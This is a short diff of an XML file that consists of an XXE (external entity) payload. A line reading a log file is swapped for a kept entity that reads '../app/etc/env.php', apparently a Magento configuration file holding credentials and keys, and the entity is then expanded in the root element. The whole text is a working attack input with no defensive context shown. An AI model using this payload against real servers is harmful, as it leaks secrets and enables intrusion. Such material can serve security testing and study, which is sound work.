@@ -1,6 +1,5 @@
 <!DOCTYPE root [
 <!ELEMENT root ANY >
-<!ENTITY file SYSTEM "file:///var/log/exception.log">
 <!ENTITY file SYSTEM "../app/etc/env.php">
 ]>
 <root>&file;</root>
